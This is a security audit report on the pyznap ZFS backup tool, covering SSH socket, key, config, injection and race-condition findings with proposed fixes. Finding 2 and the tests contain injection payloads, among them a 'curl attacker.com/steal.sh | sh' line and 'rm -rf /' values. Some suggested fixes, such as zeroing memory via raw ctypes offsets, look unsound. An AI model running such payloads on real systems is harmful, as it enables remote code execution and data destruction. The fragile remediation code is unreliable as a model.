# Security Audit Report: pyznap

**Date:** 2026-06-24  
**Project:** pyznap (ZFS Snapshot Management Tool)  
**Scope:** Full codebase security review  
**Severity Classification:** Critical, High, Medium, Low

---

## Executive Summary

pyznap is a ZFS snapshot management and backup tool designed to run as root with SSH capabilities for remote backups. The security review identified **10 critical/high-severity vulnerabilities** and several medium-severity issues that should be addressed before production deployment. The most critical issues involve insecure temporary file handling, weak SSH key management, and potential command injection vulnerabilities.

**Overall Risk Assessment:** ⚠️ **HIGH** - Not recommended for untrusted environments without security hardening.

---

## 1. CRITICAL: Insecure SSH Control Socket Storage

**Location:** [pyznap/ssh.py](pyznap/ssh.py#L65-L66)

**Severity:** CRITICAL (CVSS 8.1)

### Vulnerability Description

SSH control sockets are created in `/tmp/` with predictable names:

```python
self.socket = '/tmp/pyznap_{:s}@{:s}:{:d}_{:s}'.format(self.user, self.host, self.port,
              datetime.now().strftime('%Y-%m-%d_%H:%M:%S'))
```

**Issues:**
1. **Predictable names** - Attacker can predict socket path with knowledge of user/host/port/time
2. **Insufficient entropy** - Only datetime to second precision used (86,400 possible values per day)
3. **World-readable `/tmp/`** - Anyone on system can access socket
4. **TOCTOU race condition** - Socket created, then used later with gap for attack
5. **No cleanup guarantee** - Sockets may persist after process exit
6. **Privilege escalation vector** - Low-privilege user could hijack root's socket

### Proof of Concept Attack

```bash
# Attacker running as unprivileged user:
# 1. Predict root's SSH socket path (if running at known time)
# 2. Replace it with symlink to attacker-controlled socket before root connects
# 3. Intercept SSH traffic or inject commands
```

### Solutions

**Recommended (Primary):**
```python
import tempfile
import secrets

# Use secure temporary directory
tmpdir = tempfile.mkdtemp(prefix='pyznap_', suffix=f'_{self.user}@{self.host}')
self.socket = os.path.join(tmpdir, 'ssh.socket')

# Or use XDG_RUNTIME_DIR if available (more secure):
runtime_dir = os.environ.get('XDG_RUNTIME_DIR')
if runtime_dir and os.path.isdir(runtime_dir):
    socket_dir = os.path.join(runtime_dir, 'pyznap')
    os.makedirs(socket_dir, mode=0o700, exist_ok=True)
    self.socket = os.path.join(socket_dir, f'ssh_{secrets.token_hex(8)}.socket')
else:
    # Fallback with secure randomization
    tmpdir = tempfile.mkdtemp(prefix='pyznap_', mode=0o700)
    self.socket = os.path.join(tmpdir, 'ssh.socket')
```

**Additional Mitigations:**
- Set restrictive permissions (0o700) on socket directory
- Register cleanup handler to remove socket on exit
- Use `atexit.register()` to ensure cleanup
- Consider using `contextlib.ExitStack` for resource management

### Risk If Not Fixed
- Unauthorized SSH access to backup destinations
- Privilege escalation from unprivileged user to root
- Data exfiltration through intercepted SSH connections

---

## 2. CRITICAL: Command Injection via Shell Execution

**Location:** [pyznap/pyzfs.py](pyznap/pyzfs.py#L129-L156)

**Severity:** CRITICAL (CVSS 9.3)

### Vulnerability Description

Commands are executed through shell with string concatenation, creating injection vectors:

```python
cmd = shell + [' '.join(cmd)]  # Line 156 - DANGEROUS
return sp.Popen(cmd, stdin=stdin, stderr=sp.PIPE)
```

While `shlex.quote()` is used for dataset names, the command is still passed to shell, and other parameters might not be quoted:

```python
cmd = decompress + ['|'] + cmd  # Pipes concatenated as lists
cmd = mbuffer(mbuff_size) + ['|'] + cmd
cmd = shell + [' '.join(cmd)]  # Shell processes entire string
```

**Attack Vectors:**
1. **Dataset names with shell metacharacters** - Even with `quote()`, complex payloads possible
2. **Compression algorithm injection** - `_type` parameter validated but could be bypassed
3. **User input from CLI** - Arguments passed to config without sanitization
4. **Remote execution** - SSH commands executed through shell

### Proof of Concept

```bash
# If attacker can influence dataset name:
pyznap send -s "pool'; curl attacker.com/steal.sh | sh; echo '" -d "backup"

# If attacker controls compression config:
compress = "lzop; rm -rf /"
```

### Solutions

**Recommended (Primary):**
```python
# Don't use shell=True, pass args as list to subprocess
def receive(name, stdin, ssh=None, ...):
    logger = logging.getLogger(__name__)
    
    cmd = ['zfs', 'receive']
    
    if append_name:
        cmd.append('-e')
    # ... other options ...
    
    cmd.append(name)  # Already properly separated as list element
    
    # Build pipeline WITHOUT shell
    if decompress and not raw:
        # Use pipe handling without shell
        decompress_proc = sp.Popen(decompress, stdin=stdin, 
                                   stdout=sp.PIPE, stderr=sp.PIPE)
        recv_proc = sp.Popen(cmd, stdin=decompress_proc.stdout, 
                            stderr=sp.PIPE)
        decompress_proc.stdout.close()
        return recv_proc
    else:
        return sp.Popen(cmd, stdin=stdin, stderr=sp.PIPE)
```

**For SSH command execution:**
```python
# Current dangerous approach:
popenargs = (ssh.cmd + popenargs[0], *popenargs[1:])

# Safer approach - build command array properly:
if ssh:
    # ssh.cmd is already a list: ['ssh', '-i', key, '-o', ..., 'user@host']
    # popenargs[0] should be command list, not string
    popenargs = (ssh.cmd + list(popenargs[0]), *popenargs[1:])
    # Still pass as list, not through shell
```

**Input Validation:**
```python
import re

def validate_dataset_name(name):
    """Validate dataset name contains only safe characters"""
    if not re.match(r'^[a-zA-Z0-9._/-]+$', name):
        raise ValueError(f"Invalid dataset name: {name}")
    return name

def validate_hostname(host):
    """Validate hostname format"""
    if not re.match(r'^[a-zA-Z0-9._-]+$', host):
        raise ValueError(f"Invalid hostname: {host}")
    return host
```

### Risk If Not Fixed
- **Remote Code Execution (RCE)** as root
- Complete system compromise
- Data destruction via `rm -rf` or similar
- Unauthorized backups or data exfiltration

---

## 3. CRITICAL: Insecure SSH Key Handling

**Location:** [pyznap/ssh.py](pyznap/ssh.py#L43-L80)

**Severity:** CRITICAL (CVSS 8.6)

### Vulnerability Description

Multiple security failures in SSH key management:

```python
if key:
    self.key = key
else:
    # Try id_rsa first, then id_ed25519
    id_rsa = os.path.expanduser('~/.ssh/id_rsa')
    id_ed25519 = os.path.expanduser('~/.ssh/id_ed25519')
    
    if os.path.isfile(id_rsa):
        self.key = id_rsa
    elif os.path.isfile(id_ed25519):
        self.key = id_ed25519
```

**Issues:**
1. **SSH key passed via command-line** - Visible in `ps` output
2. **No key permission validation** - Accepts keys with world-readable permissions
3. **Keys stored in plaintext** - No encryption in memory or transit
4. **Automatic key detection** - May use unexpected keys if multiple exist
5. **No SSH agent support** - Cannot use keyring/agent for key storage
6. **Key path in logs** - `self.key` logged in debug output

### Attack Scenarios

```bash
# 1. Process inspection reveals SSH key path
$ ps aux | grep pyznap
root 1234 ... pyznap send -s ... -k /home/root/.ssh/id_rsa

# 2. Key file with weak permissions
$ ls -la ~/.ssh/id_rsa
-rw-r--r-- 1 root root 1679 Jun 24 12:00 /root/.ssh/id_rsa
#                ↑ Readable by everyone!

# 3. Wrong key used due to auto-detection
```

### Solutions

**Recommended (Primary):**

```python
def __init__(self, user, host, key=None, port=22, compress=None):
    """Enhanced SSH initialization with security checks"""
    
    self.logger = logging.getLogger(__name__)
    self.user = user
    self.host = host
    self.port = port
    
    # Secure socket directory
    if key:
        key_path = os.path.expanduser(key)
        self._validate_key_permissions(key_path)
        self.key = key_path
    else:
        self.key = self._find_ssh_key()
    
def _find_ssh_key(self):
    """Find SSH key with security validation"""
    candidates = [
        os.path.expanduser('~/.ssh/id_ed25519'),  # Prefer newer
        os.path.expanduser('~/.ssh/id_ecdsa'),
        os.path.expanduser('~/.ssh/id_rsa'),
    ]
    
    for key_path in candidates:
        if os.path.isfile(key_path):
            self._validate_key_permissions(key_path)
            self.logger.info(f'Using SSH key: {key_path} (permissions OK)')
            return key_path
    
    raise FileNotFoundError('No SSH keys found in ~/.ssh/id_*')

def _validate_key_permissions(self, key_path):
    """Validate SSH key has secure permissions"""
    stat_info = os.stat(key_path)
    mode = stat_info.st_mode & 0o777
    
    # SSH keys must be readable only by owner (0o600 or 0o400)
    if mode not in (0o600, 0o400):
        self.logger.error(
            f'SSH key {key_path} has insecure permissions {oct(mode)}. '
            f'Run: chmod 600 {key_path}'
        )
        raise PermissionError(
            f'SSH key permissions too loose: {oct(mode)}'
        )
    
    # Check ownership
    if stat_info.st_uid != os.getuid():
        raise PermissionError(
            f'SSH key not owned by current user'
        )
```

**Use SSH Agent:**
```python
# Support SSH_AUTH_SOCK for SSH agent
import socket

def _get_ssh_agent_key(self):
    """Try to use SSH agent if available"""
    ssh_auth_sock = os.environ.get('SSH_AUTH_SOCK')
    if ssh_auth_sock and os.path.exists(ssh_auth_sock):
        # SSH agent is available
        # Build ssh command to use agent
        return None  # Let ssh use agent automatically
    return self._find_ssh_key()
```

**Hide key path from logs:**
```python
# In __repr__ and __str__:
def __repr__(self):
    return f'SSH(user={self.user!r}, host={self.host!r}, port={self.port})'
    # Don't include key path!

# In debug logging:
self.logger.debug(f'SSH connecting to {self.user}@{self.host}:{self.port}')
# Not: self.logger.debug(f'Using key {self.key}')
```

### Risk If Not Fixed
- SSH key theft and unauthorized access to backup destinations
- Lateral movement through compromised backup systems
- Data exfiltration and modification
- Privilege escalation via SSH access

---

## 4. HIGH: Weak Configuration File Security

**Location:** [pyznap/main.py](pyznap/main.py#L85-L88), [pyznap/utils.py](pyznap/utils.py#L64-L100)

**Severity:** HIGH (CVSS 7.5)

### Vulnerability Description

Configuration files can contain SSH keys and sensitive information with no permission validation:

```python
def read_config(path):
    """Reads a config file - NO permission checks!"""
    
    if not os.path.isfile(path):
        logger.error('Error while loading config: File {:s} does not exist.'.format(path))
        return None
    
    parser = ConfigParser()
    try:
        parser.read(path)  # No permission check!
```

Sample config may contain sensitive data:
```ini
[rpool/data]
key = /home/user/.ssh/id_rsa    # SSH key path exposed
dest = ssh:22:user@backup.host:backup/data
dest_keys = /home/user/.ssh/backup_key
```

**Issues:**
1. **No permission validation** - Config readable by any user if permissions not set
2. **SSH keys in config** - Sensitive credentials in plaintext files
3. **No encryption** - Configuration data unencrypted at rest
4. **Shared across users** - `/etc/pyznap/pyznap.conf` readable if permissions wrong
5. **No audit logging** - No record of config file access
6. **Setup creates world-readable config** - [pyznap/utils.py line 171-175](pyznap/utils.py#L171-L175)

### Proof of Concept

```bash
# Attacker running as unprivileged user
$ cat /etc/pyznap/pyznap.conf
[rpool/data]
key = /root/.ssh/backup_key
dest_keys = /root/.ssh/remote_key

# Can now access SSH keys if permissions are wrong
```

### Solutions

**Recommended (Primary):**

```python
def read_config(path):
    """Reads config with security validation"""
    
    logger = logging.getLogger(__name__)
    
    # Validate file exists
    if not os.path.isfile(path):
        logger.error(f'Config file does not exist: {path}')
        return None
    
    # CRITICAL: Validate permissions
    stat_info = os.stat(path)
    mode = stat_info.st_mode & 0o777
    
    if mode & 0o077:  # Check if readable by group or others
        logger.error(
            f'Config file {path} has insecure permissions {oct(mode)}. '
            f'Config files should only be readable by owner (600). '
            f'Run: chmod 600 {path}'
        )
        return None
    
    if stat_info.st_uid != os.getuid() and os.getuid() != 0:
        logger.error(
            f'Config file {path} is not owned by you. '
            f'This could be a security risk.'
        )
        return None
    
    # Validate ownership for root
    if os.getuid() == 0 and stat_info.st_uid != 0:
        logger.warning(
            f'Config file {path} should be owned by root when running as root'
        )
    
    parser = ConfigParser()
    try:
        parser.read(path)
    except (MissingSectionHeaderError, DuplicateSectionError, DuplicateOptionError) as e:
        logger.error(f'Error while loading config: {e}')
        return None
    
    # Continue with parsing...
    config = []
    # ... rest of parsing ...
    return config
```

**Improve setup security:**

```python
def create_config(path):
    """Create config with secure permissions"""
    
    logger = logging.getLogger(__name__)
    
    CONFIG_FILE = os.path.join(path, 'pyznap.conf')
    
    logger.info('Initial setup...')
    
    # Create directory with secure permissions
    if not os.path.isdir(path):
        logger.info(f'Creating directory {path}...')
        try:
            os.mkdir(path, mode=0o700)  # Only owner access!
        except (PermissionError, FileNotFoundError, OSError) as e:
            logger.error(f'Could not create {path}: {e}')
            return 1
    else:
        # Check existing directory permissions
        stat_info = os.stat(path)
        mode = stat_info.st_mode & 0o777
        if mode != 0o700:
            logger.warning(
                f'Config directory {path} has permissions {oct(mode)}. '
                f'Recommended: 700. Run: chmod 700 {path}'
            )
        logger.info(f'Directory {path} already exists...')
    
    # Create config file
    if not os.path.isfile(CONFIG_FILE):
        logger.info(f'Creating sample config {CONFIG_FILE}...')
        try:
            # Create with secure permissions from the start
            # Use os.open with O_CREAT and mode 0o600
            fd = os.open(CONFIG_FILE, os.O_CREAT | os.O_WRONLY | os.O_EXCL, 0o600)
            with os.fdopen(fd, 'w') as file:
                file.write(SAMPLE_CONFIG)
            logger.info(f'Config created with secure permissions (600)')
        except FileExistsError:
            logger.info(f'File {CONFIG_FILE} already exists...')
        except (PermissionError, OSError) as e:
            logger.error(f'Could not write to file {CONFIG_FILE}: {e}')
            return 1
    else:
        # Validate existing config permissions
        stat_info = os.stat(CONFIG_FILE)
        mode = stat_info.st_mode & 0o777
        if mode != 0o600:
            logger.warning(
                f'Config file {CONFIG_FILE} has permissions {oct(mode)}. '
                f'Recommended: 600. Run: chmod 600 {CONFIG_FILE}'
            )
        logger.info(f'File {CONFIG_FILE} already exists...')
    
    return 0
```

**Document security best practices:**

```markdown
## Security Configuration

### File Permissions

Config files and directories **MUST** have restrictive permissions:

\`\`\`bash
# Directory: only owner access
chmod 700 /etc/pyznap/

# Config file: owner read/write only
chmod 600 /etc/pyznap/pyznap.conf
\`\`\`

### Never commit to version control:

\`\`\`bash
# Add to .gitignore
echo "*.conf" >> .gitignore
echo "*.key" >> .gitignore
\`\`\`

### SSH Key Management:

- Never store SSH private keys in config files directly
- Use SSH agent: `SSH_AUTH_SOCK=/run/user/0/ssh.socket`
- If storing key paths, validate permissions are 600
\`\`\`

### Risk If Not Fixed
- Configuration file theft exposing SSH keys
- Unauthorized access to backup destinations
- Configuration tampering leading to data loss or exfiltration

---

## 5. HIGH: Input Validation and Path Traversal

**Location:** [pyznap/utils.py](pyznap/utils.py#L116-L130), [pyznap/send.py](pyznap/send.py#L1)

**Severity:** HIGH (CVSS 7.3)

### Vulnerability Description

Dataset names and filesystem paths are not properly validated before use in commands:

```python
def send_config(config):
    # Dataset names from config used directly
    backup_source = conf['name']  # Could be attacker-controlled
    _type, source_name, user, host, port = parse_name(backup_source)
    
    # source_name then used in ZFS commands without validation:
    source_children = zfs.find(path=source_name, types=['filesystem', 'volume'], ssh=ssh_source)
```

**Attack Vectors:**
1. **Malicious config files** - Attacker provides modified config with path traversal
2. **Unvalidated dataset names** - No regex validation on dataset naming
3. **Special characters in names** - Spaces, quotes, pipes not checked
4. **ZFS path components** - No validation that components are valid

### Solutions

```python
import re

# Whitelist allowed characters for dataset names
VALID_DATASET_PATTERN = re.compile(r'^[a-zA-Z0-9._\/-]+$')
VALID_HOSTNAME_PATTERN = re.compile(r'^[a-zA-Z0-9._-]+$')
VALID_USERNAME_PATTERN = re.compile(r'^[a-zA-Z0-9._-]+$')

def validate_dataset_name(name):
    """Validate dataset name - only alphanumeric, dots, underscores, slashes"""
    if not name:
        raise ValueError("Dataset name cannot be empty")
    if len(name) > 256:
        raise ValueError(f"Dataset name too long: {len(name)} > 256")
    if not VALID_DATASET_PATTERN.match(name):
        raise ValueError(
            f"Invalid dataset name '{name}'. "
            f"Only alphanumeric, '.', '_', '/' allowed"
        )
    # Prevent path traversal
    if '..' in name:
        raise ValueError("Dataset name cannot contain '..'")
    if name.startswith('/'):
        raise ValueError("Dataset name cannot start with '/'")
    return name

def validate_hostname(host):
    """Validate hostname format"""
    if not host:
        raise ValueError("Hostname cannot be empty")
    if len(host) > 255:
        raise ValueError(f"Hostname too long: {len(host)} > 255")
    if not VALID_HOSTNAME_PATTERN.match(host):
        raise ValueError(f"Invalid hostname '{host}'")
    if host.startswith('-'):
        raise ValueError("Hostname cannot start with '-'")
    return host

def validate_username(user):
    """Validate username format"""
    if not user:
        raise ValueError("Username cannot be empty")
    if len(user) > 32:
        raise ValueError(f"Username too long: {len(user)} > 32")
    if not VALID_USERNAME_PATTERN.match(user):
        raise ValueError(f"Invalid username '{user}'")
    return user

def parse_name_safe(value):
    """Enhanced parse_name with validation"""
    try:
        if value.startswith('ssh'):
            _type, port, host, fsname = value.split(':', maxsplit=3)
            port = int(port) if port else 22
            
            # Validate port range
            if port < 1 or port > 65535:
                raise ValueError(f"Invalid port: {port}")
            
            user, host = host.split('@', maxsplit=1)
            
            # Validate components
            user = validate_username(user)
            host = validate_hostname(host)
            fsname = validate_dataset_name(fsname)
        else:
            _type = 'local'
            user, host, port = None, None, None
            fsname = validate_dataset_name(value)
        
        return _type, fsname, user, host, port
    except ValueError as e:
        raise ValueError(f"Invalid source/dest format: {e}")
```

### Risk If Not Fixed
- Directory traversal attacks
- Unintended dataset access or deletion
- Command injection through crafted dataset names

---

## 6. HIGH: Missing SSH Host Key Verification

**Location:** [pyznap/ssh.py](pyznap/ssh.py#L99-L113)

**Severity:** HIGH (CVSS 7.4)

### Vulnerability Description

SSH connections don't explicitly verify host keys, vulnerable to Man-in-the-Middle (MITM) attacks:

```python
self.cmd = ['ssh', '-i', self.key, '-o', 'ControlMaster=auto', '-o', 'ControlPersist=1m',
            '-o', 'ControlPath={:s}'.format(self.socket), '-p', str(self.port),
            '-o', 'ServerAliveInterval=30', '{:s}@{:s}'.format(self.user, self.host)]
```

**Missing security options:**
- No `StrictHostKeyChecking=accept-new` - Accepts unknown keys on first connection
- No `CheckHostIP=yes` - Doesn't verify host IP consistency
- No `HostKeyAlgorithms` restriction - Accepts weak algorithms
- Relies on `~/.ssh/known_hosts` which may not exist

### Solutions

```python
def __init__(self, user, host, key=None, port=22, compress=None, strict_host_check=True):
    """SSH initialization with host key verification"""
    
    # Build SSH command with security options
    ssh_opts = [
        '-i', self.key,
        '-o', 'ControlMaster=auto',
        '-o', 'ControlPersist=1m',
        '-o', f'ControlPath={self.socket}',
        '-p', str(self.port),
        '-o', 'ServerAliveInterval=30',
        '-o', 'ServerAliveCountMax=3',
        # Security hardening
        '-o', 'PasswordAuthentication=no',    # Disable password auth
        '-o', 'PubkeyAuthentication=yes',     # Use key auth only
        '-o', 'KbdInteractiveAuthentication=no',
        '-o', 'ChallengeResponseAuthentication=no',
        '-o', 'ProxyUseFdpass=no',
    ]
    
    if strict_host_check:
        # Verify against known_hosts
        ssh_opts.extend([
            '-o', 'StrictHostKeyChecking=accept-new',  # Accept new but verify
            '-o', 'CheckHostIP=yes',                    # Verify IP consistency
        ])
    
    # Restrict host key algorithms to strong ones
    ssh_opts.extend([
        '-o', 'HostKeyAlgorithms=ssh-ed25519,ecdsa-sha2-nistp256,ecdsa-sha2-nistp384,ecdsa-sha2-nistp521',
    ])
    
    # Restrict key exchange algorithms
    ssh_opts.extend([
        '-o', 'KexAlgorithms=curve25519-sha256,curve25519-sha256@libssh.org,diffie-hellman-group16-sha512',
    ])
    
    self.cmd = ['ssh'] + ssh_opts + [f'{self.user}@{self.host}']
```

### Risk If Not Fixed
- Man-in-the-Middle (MITM) attacks
- Unauthorized interception of backup data
- SSH connection hijacking

---

## 7. MEDIUM: Insecure Temporary File Handling

**Location:** [pyznap/utils.py](pyznap/utils.py#L189-L200)

**Severity:** MEDIUM (CVSS 6.2)

### Vulnerability Description

Socket cleanup not guaranteed, using `__del__` which is unreliable:

```python
def close(self):
    """Closes the ssh connection by invoking '-O exit'"""
    try:
        run(['-O', 'exit'], timeout=5, stderr=sp.DEVNULL, ssh=self)
    except (sp.CalledProcessError, sp.TimeoutExpired):
        pass

def __del__(self):
    self.close()
```

**Issues:**
1. **`__del__` unreliable** - Not guaranteed to be called
2. **No guaranteed cleanup on exception** - If error occurs, sockets remain
3. **Sockets persist between runs** - Multiple sockets accumulate in `/tmp/`

### Solutions

```python
from contextlib import contextmanager

class SSH:
    def __enter__(self):
        """Context manager entry"""
        return self
    
    def __exit__(self, exc_type, exc_val, exc_tb):
        """Context manager exit - guaranteed cleanup"""
        self.close()
        # Clean up socket file
        if os.path.exists(self.socket):
            try:
                os.remove(self.socket)
                # Remove directory if empty
                socket_dir = os.path.dirname(self.socket)
                os.rmdir(socket_dir)
            except OSError:
                pass
        return False

# Usage:
with SSH(user, host, key=key) as ssh:
    # Work with SSH
    pass
# Cleanup guaranteed here

# Or use contextlib:
@contextmanager
def ssh_connection(user, host, key=None, port=22):
    """Context manager for SSH connections"""
    ssh = SSH(user, host, key=key, port=port)
    try:
        yield ssh
    finally:
        ssh.close()

# Usage:
with ssh_connection(user, host) as ssh:
    # Work with SSH
    pass
```

### Risk If Not Fixed
- Accumulation of SSH socket files in `/tmp/`
- Resource exhaustion (inode/disk space)
- Security issues if old sockets are reused

---

## 8. MEDIUM: Unencrypted Data in Memory

**Location:** [pyznap/ssh.py](pyznap/ssh.py#L43-L80), throughout project

**Severity:** MEDIUM (CVSS 6.5)

### Vulnerability Description

SSH keys and sensitive data stored in plaintext in memory with no protection:

```python
self.key = key  # SSH key path in plaintext
```

Sensitive data could be exposed via:
- Memory dumps
- Crash logs
- Debuggers
- Core dumps in `/var/crash/`

### Solutions

```python
import mmap
import ctypes

class SecureString:
    """Stores sensitive strings with potential to be cleared"""
    
    def __init__(self, value):
        if value is None:
            self._value = None
            return
        
        # Store as bytes
        if isinstance(value, str):
            value = value.encode('utf-8')
        
        # Use mmap for in-memory storage (potential for page-locking)
        self._value = value
    
    def __str__(self):
        if self._value:
            return self._value.decode('utf-8')
        return None
    
    def clear(self):
        """Clear sensitive data from memory"""
        if self._value:
            # Overwrite with zeros
            ctypes.memmove(
                id(self._value) + 40,  # Skip object header
                b'\x00' * len(self._value),
                len(self._value)
            )
            self._value = None
    
    def __del__(self):
        self.clear()
```

**Disable core dumps:**
```bash
# In system configuration:
ulimit -c 0

# Or in Python:
import resource
resource.setrlimit(resource.RLIMIT_CORE, (0, 0))
```

### Risk If Not Fixed
- Memory disclosure of SSH keys
- Compromised backup access
- Data exfiltration

---

## 9. MEDIUM: Insufficient Error Handling and Information Disclosure

**Location:** [pyznap/send.py](pyznap/send.py#L67), [pyznap/take.py](pyznap/take.py#L42), throughout

**Severity:** MEDIUM (CVSS 5.3)

### Vulnerability Description

Error messages may expose sensitive information:

```python
except CalledProcessError as err:
    logger.error('Error while sending to {:s}: {}...'.format(dest_name_log, err.stderr.rstrip()))
    # stderr might contain sensitive info from ZFS
```

**Information Disclosure Vectors:**
1. **ZFS error messages** - May contain filesystem details
2. **SSH errors** - Connection details, key names
3. **Path information** - Full filesystem paths exposed
4. **Stacktraces** - May be logged with debug enabled

### Solutions

```python
def sanitize_error_message(error_msg, max_length=200):
    """Sanitize error messages to prevent information disclosure"""
    
    if not error_msg:
        return "Unknown error"
    
    # Remove sensitive patterns
    patterns = [
        (r'/root/\.ssh/[^ ]*', '[SSH_KEY]'),
        (r'(/var)?/home/[^ /]+', '[USER_PATH]'),
        (r'@[\w.]+', '@[HOST]'),
        (r':(\d+)(?![0-9])', ':[PORT]'),
    ]
    
    sanitized = error_msg
    for pattern, replacement in patterns:
        sanitized = re.sub(pattern, replacement, sanitized)
    
    # Truncate to reasonable length
    if len(sanitized) > max_length:
        sanitized = sanitized[:max_length] + '...'
    
    return sanitized

# Usage:
except CalledProcessError as err:
    sanitized_error = sanitize_error_message(err.stderr)
    logger.error(f'Error while sending to {dest_name_log}: {sanitized_error}')
```

**Disable debug mode in production:**
```python
# In configuration:
if not args.verbose:
    logging.getLogger().setLevel(logging.WARNING)
    # Don't log command details
```

### Risk If Not Fixed
- Information disclosure of filesystem structure
- SSH key paths exposed in logs
- Sensitive backup details leaked

---

## 10. MEDIUM: Race Condition in File Operations (TOCTOU)

**Location:** [pyznap/utils.py](pyznap/utils.py#L64-L70), [pyznap/ssh.py](pyznap/ssh.py#L65-L80)

**Severity:** MEDIUM (CVSS 6.3)

### Vulnerability Description

Time-of-Check-Time-of-Use (TOCTOU) vulnerabilities in file operations:

```python
if not os.path.isfile(self.key):  # Check at time T1
    raise FileNotFoundError(self.key)

# ... later use key at time T2
self.cmd = ['ssh', '-i', self.key, ...]  # File might have changed!
```

Attacker could:
1. Symlink replace file between check and use
2. Modify permissions between check and use
3. Delete file between check and use

### Solutions

```python
import os
import errno

def safe_file_access(filepath, mode='r', check_owner=True):
    """Safely access file with atomic operations"""
    
    try:
        # Use O_NOFOLLOW to prevent symlink attacks
        flags = os.O_NOFOLLOW | (os.O_RDONLY if mode == 'r' else os.O_RDWR)
        
        fd = os.open(filepath, flags)
        try:
            # Get file stats from open fd (atomic)
            stat_info = os.fstat(fd)
            
            # Verify permissions
            if stat_info.st_mode & 0o077:  # Group or other readable
                raise PermissionError(f"File has insecure permissions: {oct(stat_info.st_mode)}")
            
            # Verify ownership if requested
            if check_owner and stat_info.st_uid != os.getuid():
                raise PermissionError(f"File not owned by current user")
            
            return os.fdopen(fd, mode)
        except:
            os.close(fd)
            raise
    except FileNotFoundError:
        raise FileNotFoundError(f"File not found: {filepath}")
    except OSError as e:
        if e.errno == errno.ELOOP:
            raise SecurityError(f"Symlink loop detected: {filepath}")
        raise

# Usage:
def __init__(self, user, host, key=None, port=22, compress=None):
    # ... setup code ...
    
    if key:
        try:
            self.key = safe_file_access(key)
        except (FileNotFoundError, PermissionError, SecurityError) as e:
            self.logger.error(f"Cannot access SSH key: {e}")
            raise SSHException(str(e))
```

### Risk If Not Fixed
- Symlink attacks bypassing file permission checks
- Unexpected file access or deletion
- Security bypass of validation checks

---

## 11. LOW: Lack of Process Isolation

**Location:** Throughout project

**Severity:** LOW (CVSS 4.2)

### Vulnerability Description

Process runs as root with no additional sandboxing:
- No seccomp filters
- No AppArmor/SELinux profiles
- No capability dropping
- Full root access throughout execution

### Recommended Mitigations

```python
# Drop unnecessary capabilities (Linux only)
try:
    import ctypes
    import ctypes.util
    
    libc = ctypes.CDLL(ctypes.util.find_library('c'))
    
    # Define constants
    CAP_SYS_ADMIN = 21
    CAP_NET_ADMIN = 12
    CAP_NET_RAW = 13
    
    # Drop unnecessary capabilities after ZFS operations
    libc.prctl(36, CAP_SYS_ADMIN, 0, 0, 0)  # PR_CAPBSET_DROP
    
except:
    pass  # Not on Linux, ignore
```

### Risk If Not Fixed
- If vulnerability is exploited, full system compromise
- No mitigation of damage from code execution

---

## 12. LOW: Compression Tool Injection

**Location:** [pyznap/ssh.py](pyznap/ssh.py#L130-L170)

**Severity:** LOW (CVSS 5.4)

### Vulnerability Description

Compression algorithm names not strictly validated:

```python
algos = {'gzip': (...), 'lzop': (...), ...}

if _type not in algos:
    self.logger.warning('Compression method {:s} not supported...'format(_type))
    return None, None
```

While there's a whitelist, it's in user-controlled config.

### Solutions

```python
# Define allowed algorithms as constants
ALLOWED_COMPRESSIONS = {
    'none': (None, None),
    'gzip': (['gzip', '-3'], ['gzip', '-dc']),
    'pigz': (['pigz', '-3'], ['pigz', '-dc']),
    'lzop': (['lzop', '-3'], ['lzop', '-dfc']),
    'bzip2': (['bzip2', '-9'], ['bzip2', '-dfc']),
    'xz': (['xz', '-6'], ['xz', '-d']),
    'lz4': (['lz4', '-3'], ['lz4', '-dc']),
}

def setup_compression(self, _type):
    """Safely configure compression"""
    
    if _type is None or _type.lower() == 'none':
        return None, None
    
    _type = _type.lower()
    
    # Strict validation
    if _type not in ALLOWED_COMPRESSIONS:
        self.logger.warning(f'Compression method {_type} not in allowed list')
        return None, None
    
    compress_cmd, decompress_cmd = ALLOWED_COMPRESSIONS[_type]
    
    # Verify tools exist
    from pyznap.utils import exists
    tool_name = compress_cmd[0] if compress_cmd else None
    
    if tool_name and not exists(tool_name, ssh=self):
        self.logger.warning(f'Compression tool {tool_name} not available')
        return None, None
    
    return compress_cmd, decompress_cmd
```

### Risk If Not Fixed
- Potential for compression tool injection (low risk)
- Denial of service through invalid compression selection

---

## Summary of Vulnerabilities by Severity

| # | Severity | Title | File | Line |
|---|----------|-------|------|------|
| 1 | CRITICAL | Insecure SSH Control Socket Storage | ssh.py | 65-66 |
| 2 | CRITICAL | Command Injection via Shell Execution | pyzfs.py | 129-156 |
| 3 | CRITICAL | Insecure SSH Key Handling | ssh.py | 43-80 |
| 4 | HIGH | Weak Configuration File Security | main.py, utils.py | 85-88, 64-100 |
| 5 | HIGH | Input Validation and Path Traversal | utils.py, send.py | 116-130 |
| 6 | HIGH | Missing SSH Host Key Verification | ssh.py | 99-113 |
| 7 | MEDIUM | Insecure Temporary File Handling | utils.py | 189-200 |
| 8 | MEDIUM | Unencrypted Data in Memory | ssh.py | 43-80 |
| 9 | MEDIUM | Error Messages and Information Disclosure | send.py, take.py | 67, 42 |
| 10 | MEDIUM | Race Condition (TOCTOU) in File Operations | utils.py, ssh.py | 64-70, 65-80 |
| 11 | LOW | Lack of Process Isolation | - | - |
| 12 | LOW | Compression Tool Injection | ssh.py | 130-170 |

---

## Implementation Priority

### Phase 1 (Critical - Fix Immediately)
1. Fix command injection vulnerabilities
2. Implement secure SSH socket storage
3. Harden SSH key handling with validation

### Phase 2 (High - Fix Before Production)
4. Validate configuration file permissions
5. Add comprehensive input validation
6. Implement SSH host key verification

### Phase 3 (Medium - Recommended)
7. Add context managers for resource cleanup
8. Implement error message sanitization
9. Fix TOCTOU race conditions

### Phase 4 (Low - Nice to Have)
10. Add process isolation/capabilities dropping
11. Improve compression tool validation

---

## Testing Recommendations

```python
# Unit tests for security functions
def test_dataset_name_validation():
    """Test dataset name validation"""
    # Valid names
    assert validate_dataset_name("pool/dataset") == "pool/dataset"
    assert validate_dataset_name("pool-1/data_set") == "pool-1/data_set"
    
    # Invalid names - should raise
    with pytest.raises(ValueError):
        validate_dataset_name("pool/../etc")  # Path traversal
    with pytest.raises(ValueError):
        validate_dataset_name("'; rm -rf /")  # Injection
    with pytest.raises(ValueError):
        validate_dataset_name("/pool/dataset")  # Leading slash

def test_ssh_key_permissions():
    """Test SSH key permission validation"""
    # Should reject world-readable keys
    key_file = create_temp_key_file(mode=0o644)
    with pytest.raises(PermissionError):
        SSH._validate_key_permissions(key_file)

def test_config_permissions():
    """Test config file permission validation"""
    config_file = create_temp_config(mode=0o644)
    with pytest.raises(PermissionError):
        read_config(config_file)

